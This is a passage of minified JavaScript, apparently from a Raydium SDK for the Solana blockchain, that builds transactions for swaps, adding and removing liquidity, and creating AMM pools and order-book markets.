        }
      }
    },
    RE = CA("Raydium_liquidity_instruction");
  function OE(t) {
    let {
        poolInfo: e,
        poolKeys: n,
        userKeys: r,
        baseAmountIn: o,
        quoteAmountIn: i,
        fixedSide: s,
        otherAmountMin: a,
      } = t,
      u = ct.alloc(mE.span);
    mE.encode(
      {
        instruction: 3,
        baseAmountIn: bI(o),
        quoteAmountIn: bI(i),
        otherAmountMin: bI(a),
        fixedSide: "base" === s ? QI : $I,
      },
      u
    );
    let c = [
      PI({ pubkey: _c, isWritable: !1 }),
      PI({ pubkey: new Xi(e.id) }),
      PI({ pubkey: new Xi(n.authority), isWritable: !1 }),
      PI({ pubkey: new Xi(n.openOrders), isWritable: !1 }),
      PI({ pubkey: new Xi(n.targetOrders) }),
      PI({ pubkey: new Xi(e.lpMint.address) }),
      PI({ pubkey: new Xi(n.vault.A) }),
      PI({ pubkey: new Xi(n.vault.B) }),
    ];
    return (
      e.pooltype.includes("StablePool") && c.push(PI({ pubkey: wE })),
      c.push(
        PI({ pubkey: new Xi(e.marketId), isWritable: !1 }),
        PI({ pubkey: r.baseTokenAccount }),
        PI({ pubkey: r.quoteTokenAccount }),
        PI({ pubkey: r.lpTokenAccount }),
        PI({ pubkey: r.owner, isWritable: !1, isSigner: !0 }),
        PI({ pubkey: new Xi(n.marketEventQueue), isWritable: !1 })
      ),
      new ws({ programId: new Xi(e.programId), keys: c, data: u })
    );
  }
  function ME(t) {
    let {
        poolInfo: e,
        poolKeys: n,
        userKeys: r,
        lpAmount: o,
        baseAmountMin: i,
        quoteAmountMin: s,
      } = t,
      a = YI(n),
      u = 4;
    if ((e.pooltype.includes("StablePool") && (u = 5), 4 === u || 5 === u)) {
      let t = ct.alloc(gE.span);
      gE.encode(
        {
          instruction: 4,
          lpAmount: bI(o),
          baseAmountMin: bI(i),
          quoteAmountMin: bI(s),
        },
        t
      );
      let e = [
        PI({ pubkey: _c, isWritable: !1 }),
        PI({ pubkey: a.id }),
        PI({ pubkey: a.authority, isWritable: !1 }),
        PI({ pubkey: a.openOrders }),
        PI({ pubkey: a.targetOrders }),
        PI({ pubkey: a.mintLp.address }),
        PI({ pubkey: a.vault.A }),
        PI({ pubkey: a.vault.B }),
      ];
      return (
        5 === u
          ? e.push(PI({ pubkey: wE }))
          : (e.push(PI({ pubkey: a.id })), e.push(PI({ pubkey: a.id }))),
        e.push(
          PI({ pubkey: a.marketProgramId, isWritable: !1 }),
          PI({ pubkey: a.marketId }),
          PI({ pubkey: a.marketBaseVault }),
          PI({ pubkey: a.marketQuoteVault }),
          PI({ pubkey: a.marketAuthority, isWritable: !1 }),
          PI({ pubkey: r.lpTokenAccount }),
          PI({ pubkey: r.baseTokenAccount }),
          PI({ pubkey: r.quoteTokenAccount }),
          PI({ pubkey: r.owner, isWritable: !1, isSigner: !0 }),
          PI({ pubkey: a.marketEventQueue }),
          PI({ pubkey: a.marketBids }),
          PI({ pubkey: a.marketAsks })
        ),
        new ws({ programId: a.programId, keys: e, data: t })
      );
    }
    return new ws({ programId: a.programId, keys: [] });
  }
  function LE({
    programId: t,
    ammId: e,
    ammAuthority: n,
    ammOpenOrders: r,
    lpMint: o,
    coinMint: i,
    pcMint: s,
    coinVault: a,
    pcVault: u,
    withdrawQueue: c,
    ammTargetOrders: l,
    poolTempLp: d,
    marketProgramId: f,
    marketId: h,
    userWallet: p,
    userCoinVault: m,
    userPcVault: g,
    userLpVault: y,
    nonce: w,
    openTime: b,
    coinAmount: v,
    pcAmount: A,
    ammConfigId: k,
    feeDestinationId: I,
  }) {
    let S = VT([
        MT("instruction"),
        MT("nonce"),
        NT("openTime"),
        NT("pcAmount"),
        NT("coinAmount"),
      ]),
      _ = [
        { pubkey: _c, isSigner: !1, isWritable: !1 },
        { pubkey: Cc, isSigner: !1, isWritable: !1 },
        { pubkey: Fs.programId, isSigner: !1, isWritable: !1 },
        { pubkey: DI, isSigner: !1, isWritable: !1 },
        { pubkey: e, isSigner: !1, isWritable: !0 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !0 },
        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: i, isSigner: !1, isWritable: !1 },
        { pubkey: s, isSigner: !1, isWritable: !1 },
        { pubkey: a, isSigner: !1, isWritable: !0 },
        { pubkey: u, isSigner: !1, isWritable: !0 },
        { pubkey: l, isSigner: !1, isWritable: !0 },
        { pubkey: k, isSigner: !1, isWritable: !1 },
        { pubkey: I, isSigner: !1, isWritable: !0 },
        { pubkey: f, isSigner: !1, isWritable: !1 },
        { pubkey: h, isSigner: !1, isWritable: !1 },
        { pubkey: p, isSigner: !0, isWritable: !0 },
        { pubkey: m, isSigner: !1, isWritable: !0 },
        { pubkey: g, isSigner: !1, isWritable: !0 },
        { pubkey: y, isSigner: !1, isWritable: !0 },
      ],
      T = ct.alloc(S.span);
    return (
      S.encode(
        { instruction: 1, nonce: w, openTime: b, coinAmount: v, pcAmount: A },
        T
      ),
      {
        instruction: new ws({ keys: _, programId: t, data: T }),
        instructionType: RS,
      }
    );
  }
  function NE(t) {
    let {
      poolKeys: e,
      version: n,
      userKeys: r,
      amountIn: o,
      amountOut: i,
      fixedSide: s,
    } = t;
    if (4 === n || 5 === n) {
      let a = { poolKeys: e, userKeys: r };
      if ("in" === s)
        return (function (
          { poolKeys: t, userKeys: e, amountIn: n, minAmountOut: r },
          o
        ) {
          let i = YI(t),
            s = ct.alloc(fE.span);
          fE.encode(
            { instruction: 9, amountIn: bI(n), minAmountOut: bI(r) },
            s
          );
          let a = [
            PI({ pubkey: _c, isWritable: !1 }),
            PI({ pubkey: i.id }),
            PI({ pubkey: i.authority, isWritable: !1 }),
            PI({ pubkey: i.openOrders }),
          ];
          return (
            4 === o && a.push(PI({ pubkey: i.targetOrders })),
            a.push(PI({ pubkey: i.vault.A }), PI({ pubkey: i.vault.B })),
            5 === o && a.push(PI({ pubkey: wE })),
            a.push(
              PI({ pubkey: i.marketProgramId, isWritable: !1 }),
              PI({ pubkey: i.marketId }),
              PI({ pubkey: i.marketBids }),
              PI({ pubkey: i.marketAsks }),
              PI({ pubkey: i.marketEventQueue }),
              PI({ pubkey: i.marketBaseVault }),
              PI({ pubkey: i.marketQuoteVault }),
              PI({ pubkey: i.marketAuthority, isWritable: !1 }),
              PI({ pubkey: e.tokenAccountIn }),
              PI({ pubkey: e.tokenAccountOut }),
              PI({ pubkey: e.owner, isWritable: !1, isSigner: !0 })
            ),
            new ws({ programId: i.programId, keys: a, data: s })
          );
        })(AA(vA({}, a), { amountIn: o, minAmountOut: i }), n);
      if ("out" === s)
        return (function (
          { poolKeys: t, userKeys: e, maxAmountIn: n, amountOut: r },
          o
        ) {
          let i = YI(t),
            s = ct.alloc(hE.span);
          hE.encode(
            { instruction: 11, maxAmountIn: bI(n), amountOut: bI(r) },
            s
          );
          let a = [
            PI({ pubkey: _c, isWritable: !1 }),
            PI({ pubkey: i.id }),
            PI({ pubkey: i.authority, isWritable: !1 }),
            PI({ pubkey: i.openOrders }),
            PI({ pubkey: i.targetOrders }),
            PI({ pubkey: i.vault.A }),
            PI({ pubkey: i.vault.B }),
          ];
          return (
            5 === o && a.push(PI({ pubkey: wE })),
            a.push(
              PI({ pubkey: i.marketProgramId, isWritable: !1 }),
              PI({ pubkey: i.marketId }),
              PI({ pubkey: i.marketBids }),
              PI({ pubkey: i.marketAsks }),
              PI({ pubkey: i.marketEventQueue }),
              PI({ pubkey: i.marketBaseVault }),
              PI({ pubkey: i.marketQuoteVault }),
              PI({ pubkey: i.marketAuthority, isWritable: !1 }),
              PI({ pubkey: e.tokenAccountIn }),
              PI({ pubkey: e.tokenAccountOut }),
              PI({ pubkey: e.owner, isWritable: !1, isSigner: !0 })
            ),
            new ws({ programId: i.programId, keys: a, data: s })
          );
        })(AA(vA({}, a), { maxAmountIn: o, amountOut: i }), n);
      RE.logWithError("invalid params", "params", t);
    }
    throw (
      (RE.logWithError("invalid version", "poolKeys.version", n),
      new Error("invalid version"))
    );
  }
  var DE = CA("Raydium_liquidity_serum");
  function UE({ programId: t }) {
    let { publicKey: e } = u_([ct.from("amm_config_account_seed", "utf-8")], t);
    return e;
  }
  function qE({ name: t, programId: e, marketId: n }) {
    let { publicKey: r } = u_(
      [e.toBuffer(), n.toBuffer(), ct.from(t, "utf-8")],
      e
    );
    return r;
  }
  function WE({ programId: t }) {
    return u_(
      [ct.from([97, 109, 109, 32, 97, 117, 116, 104, 111, 114, 105, 116, 121])],
      t
    );
  }
  function zE({
    version: t,
    marketVersion: e,
    marketId: n,
    baseMint: r,
    quoteMint: o,
    baseDecimals: i,
    quoteDecimals: s,
    programId: a,
    marketProgramId: u,
  }) {
    let c = qE({ name: "amm_associated_seed", programId: a, marketId: n }),
      l = qE({ name: "lp_mint_associated_seed", programId: a, marketId: n }),
      { publicKey: d, nonce: f } = WE({ programId: a }),
      h = qE({ name: "coin_vault_associated_seed", programId: a, marketId: n }),
      p = qE({ name: "pc_vault_associated_seed", programId: a, marketId: n }),
      m = qE({
        name: "temp_lp_token_associated_seed",
        programId: a,
        marketId: n,
      }),
      g = (function ({ programId: t, marketId: e }) {
        let { publicKey: n } = u_(
          [
            t.toBuffer(),
            e.toBuffer(),
            ct.from("open_order_associated_seed", "utf-8"),
          ],
          t
        );
        return n;
      })({ programId: a, marketId: n }),
      y = qE({ name: "target_associated_seed", programId: a, marketId: n }),
      w = qE({ name: "withdraw_associated_seed", programId: a, marketId: n }),
      { publicKey: b } = (function ({ programId: t, marketId: e }) {
        let n,
          r = [e.toBuffer()],
          o = 0;
        for (; o < 100; ) {
          try {
            let e = r.concat(ct.from([o]), ct.alloc(7));
            n = Xi.createProgramAddressSync(e, t);
          } catch (i) {
            if (i instanceof TypeError) throw i;
            o++;
            continue;
          }
          return { publicKey: n, nonce: o };
        }
        throw (
          (DE.logWithError(
            "unable to find a viable program address nonce",
            "params",
            { programId: t, marketId: e }
          ),
          new Error("unable to find a viable program address nonce"))
        );
      })({ programId: u, marketId: n });
    return {
      id: c,
      baseMint: r,
      quoteMint: o,
      lpMint: l,
      baseDecimals: i,
      quoteDecimals: s,
      lpDecimals: i,
      version: t,
      programId: a,
      authority: d,
      nonce: f,
      baseVault: h,
      quoteVault: p,
      lpVault: m,
      openOrders: g,
      targetOrders: y,
      withdrawQueue: w,
      marketVersion: e,
      marketProgramId: u,
      marketId: n,
      marketAuthority: b,
      lookupTableAccount: Xi.default,
      configId: UE({ programId: a }),
    };
  }
  var KE = {
      volume: 0,
      volumeQuote: 0,
      volumeFee: 0,
      apr: 0,
      feeApr: 0,
      priceMin: 0,
      priceMax: 0,
      rewardApr: [],
    },
    FE = (t) => {
      let e = {},
        n = _c.toBase58();
      return (
        Object.keys(t).map((r) => {
          let o = t[r],
            [i, s] = [o.baseMint.toBase58(), o.quoteMint.toBase58()];
          e[r] = {
            id: r,
            version: 4,
            status: o.status.toNumber(),
            programId: o.programId.toBase58(),
            mintA: uE({
              address: i,
              programId: n,
              decimals: o.baseDecimal.toNumber(),
            }),
            mintB: uE({
              address: s,
              programId: n,
              decimals: o.quoteDecimal.toNumber(),
            }),
            rewardDefaultInfos: [],
            rewardDefaultPoolInfos: "Ecosystem",
            price: o.poolPrice.toNumber(),
            mintAmountA: new mI(o.mintAAmount.toString())
              .div(10 ** o.baseDecimal.toNumber())
              .toNumber(),
            mintAmountB: new mI(o.mintBAmount.toString())
              .div(10 ** o.quoteDecimal.toNumber())
              .toNumber(),
            baseReserve: o.baseReserve,
            quoteReserve: o.quoteReserve,
            feeRate: new mI(o.tradeFeeNumerator.toString())
              .div(o.tradeFeeDenominator.toString())
              .toNumber(),
            openTime: o.poolOpenTime.toString(),
            tvl: 0,
            day: KE,
            week: KE,
            month: KE,
            pooltype: [],
            farmUpcomingCount: 0,
            farmOngoingCount: 0,
            farmFinishedCount: 0,
            type: "Standard",
            marketId: o.marketId.toBase58(),
            configId: UE({ programId: o.programId }).toBase58(),
            lpPrice: 0,
            lpAmount: new mI(o.lpReserve.toString())
              .div(
                10 **
                  Math.min(o.baseDecimal.toNumber(), o.quoteDecimal.toNumber())
              )
              .toNumber(),
            lpMint: uE({
              address: o.lpMint.toBase58(),
              programId: n,
              decimals: Math.min(
                o.baseDecimal.toNumber(),
                o.quoteDecimal.toNumber()
              ),
            }),
            burnPercent: 0,
          };
        }),
        e
      );
    };
  var jE = VT([
    ET(5),
    (function (t = "accountFlags") {
      let e = new OT(t);
      return (
        e.addBoolean("initialized"),
        e.addBoolean("market"),
        e.addBoolean("openOrders"),
        e.addBoolean("requestQueue"),
        e.addBoolean("eventQueue"),
        e.addBoolean("bids"),
        e.addBoolean("asks"),
        e
      );
    })("accountFlags"),
    WT("ownAddress"),
    NT("vaultSignerNonce"),
    WT("baseMint"),
    WT("quoteMint"),
    WT("baseVault"),
    NT("baseDepositsTotal"),
    NT("baseFeesAccrued"),
    WT("quoteVault"),
    NT("quoteDepositsTotal"),
    NT("quoteFeesAccrued"),
    NT("quoteDustThreshold"),
    WT("requestQueue"),
    WT("eventQueue"),
    WT("bids"),
    WT("asks"),
    NT("baseLotSize"),
    NT("quoteLotSize"),
    NT("feeRateBps"),
    NT("referrerRebatesAccrued"),
    ET(7),
  ]);
  async function GE({ connection: t, wallet: e, marketInfo: n }) {
    var r, o, i, s, a, u, c, l;
    let d = new bs(),
      f = await t.getMinimumBalanceForRentExemption(165);
    d.add(
      Fs.createAccountWithSeed({
        fromPubkey: e,
        basePubkey: e,
        seed: n.baseVault.seed,
        newAccountPubkey: n.baseVault.publicKey,
        lamports: f,
        space: 165,
        programId: _c,
      }),
      Fs.createAccountWithSeed({
        fromPubkey: e,
        basePubkey: e,
        seed: n.quoteVault.seed,
        newAccountPubkey: n.quoteVault.publicKey,
        lamports: f,
        space: 165,
        programId: _c,
      }),
      yl(n.baseVault.publicKey, n.baseMint, n.vaultOwner),
      yl(n.quoteVault.publicKey, n.quoteMint, n.vaultOwner),
      Fs.createAccountWithSeed({
        fromPubkey: e,
        basePubkey: e,
        seed: n.id.seed,
        newAccountPubkey: n.id.publicKey,
        lamports: await t.getMinimumBalanceForRentExemption(jE.span),
        space: jE.span,
        programId: n.programId,
      })
    );
    let h = new bs();
    return (
      h.add(
        Fs.createAccountWithSeed({
          fromPubkey: e,
          basePubkey: e,
          seed: n.requestQueue.seed,
          newAccountPubkey: n.requestQueue.publicKey,
          lamports: n.lowestFeeMarket
            ? 6208320
            : await t.getMinimumBalanceForRentExemption(
                null != (r = n.requestQueueSpace) ? r : 5132
              ),
          space: n.lowestFeeMarket
            ? 764
            : null != (o = n.requestQueueSpace)
            ? o
            : 5132,
          programId: n.programId,
        }),
        Fs.createAccountWithSeed({
          fromPubkey: e,
          basePubkey: e,
          seed: n.eventQueue.seed,
          newAccountPubkey: n.eventQueue.publicKey,
          lamports: n.lowestFeeMarket
            ? 79594560
            : await t.getMinimumBalanceForRentExemption(
                null != (i = n.eventQueueSpace) ? i : 262156
              ),
          space: n.lowestFeeMarket
            ? 11308
            : null != (s = n.eventQueueSpace)
            ? s
            : 262156,
          programId: n.programId,
        }),
        Fs.createAccountWithSeed({
          fromPubkey: e,
          basePubkey: e,
          seed: n.bids.seed,
          newAccountPubkey: n.bids.publicKey,
          lamports: n.lowestFeeMarket
            ? 101977920
            : await t.getMinimumBalanceForRentExemption(
                null != (a = n.orderbookQueueSpace) ? a : 65548
              ),
          space: n.lowestFeeMarket
            ? 14524
            : null != (u = n.orderbookQueueSpace)
            ? u
            : 65548,
          programId: n.programId,
        }),
        Fs.createAccountWithSeed({
          fromPubkey: e,
          basePubkey: e,
          seed: n.asks.seed,
          newAccountPubkey: n.asks.publicKey,
          lamports: n.lowestFeeMarket
            ? 101977920
            : await t.getMinimumBalanceForRentExemption(
                null != (c = n.orderbookQueueSpace) ? c : 65548
              ),
          space: n.lowestFeeMarket
            ? 14524
            : null != (l = n.orderbookQueueSpace)
            ? l
            : 65548,
          programId: n.programId,
        }),
        (function ({ programId: t, marketInfo: e }) {
          let n = VT([
              MT("version"),
              LT("instruction"),
              NT("baseLotSize"),
              NT("quoteLotSize"),
              ST("feeRateBps"),
              NT("vaultSignerNonce"),
              NT("quoteDustThreshold"),
            ]),
            r = [
              { pubkey: e.id, isSigner: !1, isWritable: !0 },
              { pubkey: e.requestQueue, isSigner: !1, isWritable: !0 },
              { pubkey: e.eventQueue, isSigner: !1, isWritable: !0 },
              { pubkey: e.bids, isSigner: !1, isWritable: !0 },
              { pubkey: e.asks, isSigner: !1, isWritable: !0 },
              { pubkey: e.baseVault, isSigner: !1, isWritable: !0 },
              { pubkey: e.quoteVault, isSigner: !1, isWritable: !0 },
              { pubkey: e.baseMint, isSigner: !1, isWritable: !1 },
              { pubkey: e.quoteMint, isSigner: !1, isWritable: !1 },
              {
                pubkey: e.authority ? e.quoteMint : Ts,
                isSigner: !1,
                isWritable: !1,
              },
            ]
              .concat(
                e.authority
                  ? { pubkey: e.authority, isSigner: !1, isWritable: !1 }
                  : []
              )
              .concat(
                e.authority && e.pruneAuthority
                  ? { pubkey: e.pruneAuthority, isSigner: !1, isWritable: !1 }
                  : []
              ),
            o = ct.alloc(n.span);
          return (
            n.encode(
              {
                version: 0,
                instruction: 0,
                baseLotSize: e.baseLotSize,
                quoteLotSize: e.quoteLotSize,
                feeRateBps: e.feeRateBps,
                vaultSignerNonce: e.vaultSignerNonce,
                quoteDustThreshold: e.quoteDustThreshold,
              },
              o
            ),
            new ws({ keys: r, programId: t, data: o })
          );
        })({
          programId: n.programId,
          marketInfo: {
            id: n.id.publicKey,
            requestQueue: n.requestQueue.publicKey,
            eventQueue: n.eventQueue.publicKey,
            bids: n.bids.publicKey,
            asks: n.asks.publicKey,
            baseVault: n.baseVault.publicKey,
            quoteVault: n.quoteVault.publicKey,
            baseMint: n.baseMint,
            quoteMint: n.quoteMint,
            baseLotSize: n.baseLotSize,
            quoteLotSize: n.quoteLotSize,
            feeRateBps: n.feeRateBps,
            vaultSignerNonce: n.vaultSignerNonce,
            quoteDustThreshold: n.quoteDustThreshold,
          },
        })
      ),
      [
        { transaction: d, signer: [], instructionTypes: [cS, cS, lS, lS] },
        {
          transaction: h,
          signer: [],
          instructionTypes: [cS, cS, cS, cS, cS, pS],
        },
      ]
    );
  }
  var VE = class extends iT {
      async create({
        baseInfo: t,
        quoteInfo: e,
        lotSize: n,
        tickSize: r,
        dexProgramId: o,
        requestQueueSpace: i,
        eventQueueSpace: s,
        orderbookQueueSpace: a,
        lowestFeeMarket: u,
        assignSeed: c,
        txVersion: l,
        computeBudgetConfig: d,
        txTipConfig: f,
        feePayer: h,
      }) {
        let p = this.scope.ownerPubKey,
          m = c
            ? `${t.mint.toBase58().slice(0, 10)}-${e.mint
                .toBase58()
                .slice(0, 10)}-${c}`
            : void 0,
          g = ZT({
            fromPublicKey: p,
            programId: o,
            assignSeed: m && `${m}-market`,
          }),
          y = ZT({
            fromPublicKey: p,
            programId: o,
            assignSeed: m && `${m}-request`,
          }),
          w = ZT({
            fromPublicKey: p,
            programId: o,
            assignSeed: m && `${m}-event`,
          }),
          b = ZT({
            fromPublicKey: p,
            programId: o,
            assignSeed: m && `${m}-bids`,
          }),
          v = ZT({
            fromPublicKey: p,
            programId: o,
            assignSeed: m && `${m}-asks`,
          }),
          A = ZT({
            fromPublicKey: p,
            programId: _c,
            assignSeed: m && `${m}-baseVault`,
          }),
          k = ZT({
            fromPublicKey: p,
            programId: _c,
            assignSeed: m && `${m}-quoteVault`,
          }),
          I = new Zn(100);
        let { vaultOwner: S, vaultSignerNonce: _ } = (function () {
            let t = new Zn(0);
            for (;;)
              try {
                return {
                  vaultOwner: Xi.createProgramAddressSync(
                    [g.publicKey.toBuffer(), t.toArrayLike(ct, "le", 8)],
                    o
                  ),
                  vaultSignerNonce: t,
                };
              } catch {
                if ((t.iaddn(1), t.gt(new Zn(25555))))
                  throw Error("find vault owner error");
              }
          })(),
          T = new Zn(Math.round(10 ** t.decimals * n)),
          C = new Zn(Math.round(n * 10 ** e.decimals * r));
        if (T.eq(QI)) throw Error("lot size is too small");
        if (C.eq(QI)) throw Error("tick size or lot size is too small");
        let B = await GE({
            connection: this.scope.connection,
            wallet: this.scope.ownerPubKey,
            marketInfo: {
              programId: o,
              id: g,
              baseMint: t.mint,
              quoteMint: e.mint,
              baseVault: A,
              quoteVault: k,
              vaultOwner: S,
              requestQueue: y,
              eventQueue: w,
              bids: b,
              asks: v,
              feeRateBps: 0,
              quoteDustThreshold: I,
              vaultSignerNonce: _,
              baseLotSize: T,
              quoteLotSize: C,
              requestQueueSpace: i,
              eventQueueSpace: s,
              orderbookQueueSpace: a,
              lowestFeeMarket: u,
            },
          }),
          E = this.createTxBuilder(h);
        E.addInstruction({
          instructions: B[0].transaction.instructions,
          signers: B[0].signer,
        });
        for await (let x of B.slice(1, B.length))
          E.addInstruction({
            instructions: x.transaction.instructions,
            signers: x.signer,
            instructionTypes: x.instructionTypes,
          });
        return 0 === l
          ? E.sizeCheckBuildV0({
              computeBudgetConfig: d,
              address: {
                marketId: g.publicKey,
                requestQueue: y.publicKey,
                eventQueue: w.publicKey,
                bids: b.publicKey,
                asks: v.publicKey,
                baseVault: A.publicKey,
                quoteVault: k.publicKey,
                baseMint: new Xi(t.mint),
                quoteMint: new Xi(e.mint),
              },
            })
          : E.sizeCheckBuild({
              computeBudgetConfig: d,
              address: {
                marketId: g.publicKey,
                requestQueue: y.publicKey,
                eventQueue: w.publicKey,
                bids: b.publicKey,
                asks: v.publicKey,
                baseVault: A.publicKey,
                quoteVault: k.publicKey,
                baseMint: new Xi(t.mint),
                quoteMint: new Xi(e.mint),
              },
            });
      }
    },
    HE = class extends iT {
      constructor(t) {
        super(t),
          (this.stableLayout = new PE({ connection: this.scope.connection }));
      }
      async initLayout() {
        await this.stableLayout.initStableModelLayout();
      }
      async load() {
        this.checkDisabled();
      }
      computePairAmount({ poolInfo: t, amount: e, slippage: n, baseIn: r }) {
        let o = new Zn(
            new mI(e).mul(10 ** t[r ? "mintA" : "mintB"].decimals).toFixed(0)
          ),
          i = sE(t[r ? "mintB" : "mintA"]),
          [s, a] = [
            new Zn(
              new mI(t.mintAmountA).mul(10 ** t.mintA.decimals).toString()
            ),
            new Zn(
              new mI(t.mintAmountB).mul(10 ** t.mintB.decimals).toString()
            ),
          ],
          u = new Zn(
            new mI(t.lpAmount)
              .mul(10 ** t.lpMint.decimals)
              .toFixed(0, mI.ROUND_DOWN)
          );
        this.logDebug(
          "baseReserve:",
          s.toString(),
          "quoteReserve:",
          a.toString()
        ),
          this.logDebug(
            "tokenIn:",
            r ? t.mintA.symbol : t.mintB.symbol,
            "amountIn:",
            o.toString(),
            "anotherToken:",
            r ? t.mintB.symbol : t.mintA.symbol,
            "slippage:",
            `${n.toSignificant()}%`,
            "baseReserve",
            s.toString(),
            "quoteReserve",
            a.toString()
          );
        let c = r ? "base" : "quote";
        this.logDebug("input side:", c);
        let l = QI;
        o.isZero() || (l = "base" === c ? nS(o.mul(a), s) : nS(o.mul(s), a)),
          this.logDebug("amountRaw:", l.toString(), "lpAmount:", u.toString());
        let d = nS(o.mul(u), "base" === c ? s : a);
        this.logDebug("liquidity:", d.toString());
        let f = new XI(new Zn(1)).add(n),
          h = new XI(new Zn(1)).sub(n),
          p = f.mul(l).quotient,
          m = h.mul(l).quotient,
          g = new BI(i, l),
          y = new BI(i, p),
          w = new BI(i, m);
        return (
          this.logDebug(
            "anotherAmount:",
            g.toFixed(),
            "maxAnotherAmount:",
            y.toFixed()
          ),
          {
            anotherAmount: g,
            maxAnotherAmount: y,
            minAnotherAmount: w,
            liquidity: d,
          }
        );
      }
      async getAmmPoolKeys(t) {
        return (await this.scope.api.fetchPoolKeysById({ idList: [t] }))[0];
      }
      async addLiquidity(t) {
        let {
          poolInfo: e,
          poolKeys: n,
          amountInA: r,
          amountInB: o,
          otherAmountMin: i,
          fixedSide: s,
          config: a,
          txVersion: u,
          computeBudgetConfig: c,
          txTipConfig: l,
          feePayer: d,
        } = t;
        !1 === this.scope.availability.addStandardPosition &&
          this.logAndCreateError(
            "add liquidity feature disabled in your region"
          ),
          this.logDebug("amountInA:", r, "amountInB:", o),
          (r.isZero() || o.isZero()) &&
            this.logAndCreateError(
              "amounts must greater than zero",
              "amountInA & amountInB",
              { amountInA: r.toFixed(), amountInB: o.toFixed() }
            );
        let { account: f } = this.scope,
          { bypassAssociatedCheck: h, checkCreateATAOwner: p } = vA(
            { bypassAssociatedCheck: !1, checkCreateATAOwner: !1 },
            a
          ),
          [m, g] = [r.token, o.token],
          y = await f.getCreatedTokenAccount({
            mint: m.mint,
            associatedOnly: !1,
          }),
          w = await f.getCreatedTokenAccount({
            mint: g.mint,
            associatedOnly: !1,
          });
        !y &&
          !w &&
          this.logAndCreateError(
            "cannot found target token accounts",
            "tokenAccounts",
            f.tokenAccounts
          );
        let b = await f.getCreatedTokenAccount({
            mint: new Xi(e.lpMint.address),
          }),
          v = [m, g],
          A = [y, w],
          k = [r.raw, o.raw],
          I = r.token.mint.toBase58() === e.mintA.address ? "base" : "quote",
          S = "base";
        ["quote", "base"].includes(I) ||
          this.logAndCreateError("invalid fixedSide", "fixedSide", s),
          "quote" === I
            ? (v.reverse(),
              A.reverse(),
              k.reverse(),
              (S = "a" === s ? "quote" : "base"))
            : "base" === I && (S = "a" === s ? "base" : "quote");
        let [_, T] = v,
          [C, B] = A,
          [E, x] = k,
          P = null != n ? n : await this.getAmmPoolKeys(e.id),
          R = this.createTxBuilder(d),
          O = await f.handleTokenAccount({
            side: "in",
            amount: E,
            mint: _.mint,
            tokenAccount: C,
            bypassAssociatedCheck: h,
            checkCreateATAOwner: p,
          }),
          { tokenAccount: M } = O,
          L = kA(O, ["tokenAccount"]);
        R.addInstruction(L);
        let N = await f.handleTokenAccount({
            side: "in",
            amount: x,
            mint: T.mint,
            tokenAccount: B,
            bypassAssociatedCheck: h,
            checkCreateATAOwner: p,
          }),
          { tokenAccount: D } = N,
          U = kA(N, ["tokenAccount"]);
        R.addInstruction(U);
        let q = await f.handleTokenAccount({
            side: "out",
            amount: 0,
            mint: new Xi(e.lpMint.address),
            tokenAccount: b,
            bypassAssociatedCheck: h,
            checkCreateATAOwner: p,
          }),
          { tokenAccount: W } = q,
          z = kA(q, ["tokenAccount"]);
        return (
          R.addInstruction(z),
          R.addInstruction({
            instructions: [
              OE({
                poolInfo: e,
                poolKeys: P,
                userKeys: {
                  baseTokenAccount: M,
                  quoteTokenAccount: D,
                  lpTokenAccount: W,
                  owner: this.scope.ownerPubKey,
                },
                baseAmountIn: E,
                quoteAmountIn: x,
                otherAmountMin: i.raw,
                fixedSide: S,
              }),
            ],
            instructionTypes: [e.pooltype.includes("StablePool") ? OS : ES],
            lookupTableAddress: P.lookupTableAccount
              ? [P.lookupTableAccount]
              : [],
          }),
          R.addCustomComputeBudget(c),
          R.addTipInstruction(l),
          0 === u ? await R.buildV0() : R.build()
        );
      }
      async removeLiquidity(t) {
        !1 === this.scope.availability.removeStandardPosition &&
          this.logAndCreateError(
            "remove liquidity feature disabled in your region"
          );
        let {
            poolInfo: e,
            poolKeys: n,
            lpAmount: r,
            baseAmountMin: o,
            quoteAmountMin: i,
            config: s,
            txVersion: a,
            computeBudgetConfig: u,
            txTipConfig: c,
            feePayer: l,
          } = t,
          d = null != n ? n : await this.getAmmPoolKeys(e.id),
          [f, h, p] = [
            new Xi(e.mintA.address),
            new Xi(e.mintB.address),
            new Xi(e.lpMint.address),
          ];
        this.logDebug("lpAmount:", r),
          this.logDebug("baseAmountMin:", o),
          this.logDebug("quoteAmountMin:", i),
          r.isZero() &&
            this.logAndCreateError(
              "amount must greater than zero",
              "lpAmount",
              r.toString()
            );
        let { account: m } = this.scope,
          g = await m.getCreatedTokenAccount({ mint: p, associatedOnly: !1 });
        g ||
          this.logAndCreateError(
            "cannot found lpTokenAccount",
            "tokenAccounts",
            m.tokenAccounts
          );
        let y = await m.getCreatedTokenAccount({ mint: f }),
          w = await m.getCreatedTokenAccount({ mint: h }),
          b = this.createTxBuilder(l),
          { bypassAssociatedCheck: v, checkCreateATAOwner: A } = vA(
            { bypassAssociatedCheck: !1, checkCreateATAOwner: !1 },
            s
          ),
          k = await m.handleTokenAccount({
            side: "out",
            amount: 0,
            mint: f,
            tokenAccount: y,
            bypassAssociatedCheck: v,
            checkCreateATAOwner: A,
          }),
          { tokenAccount: I } = k,
          S = kA(k, ["tokenAccount"]);
        b.addInstruction(S);
        let _ = await m.handleTokenAccount({
            side: "out",
            amount: 0,
            mint: h,
            tokenAccount: w,
            bypassAssociatedCheck: v,
            checkCreateATAOwner: A,
          }),
          { tokenAccount: T } = _,
          C = kA(_, ["tokenAccount"]);
        return (
          b.addInstruction(C),
          b.addInstruction({
            instructions: [
              ME({
                poolInfo: e,
                poolKeys: d,
                userKeys: {
                  lpTokenAccount: g,
                  baseTokenAccount: I,
                  quoteTokenAccount: T,
                  owner: this.scope.ownerPubKey,
                },
                lpAmount: r,
                baseAmountMin: o,
                quoteAmountMin: i,
              }),
            ],
            lookupTableAddress: d.lookupTableAccount
              ? [d.lookupTableAccount]
              : [],
            instructionTypes: [e.pooltype.includes("StablePool") ? MS : xS],
          }),
          b.addCustomComputeBudget(u),
          b.addTipInstruction(c),
          0 === a ? await b.buildV0() : b.build()
        );
      }
      async removeAllLpAndCreateClmmPosition({
        poolInfo: t,
        clmmPoolInfo: e,
        removeLpAmount: n,
        createPositionInfo: r,
        farmInfo: o,
        userFarmLpAmount: i,
        base: s,
        computeBudgetConfig: a,
        payer: u,
        userAuxiliaryLedgers: c,
        tokenProgram: l = _c,
        checkCreateATAOwner: d = !0,
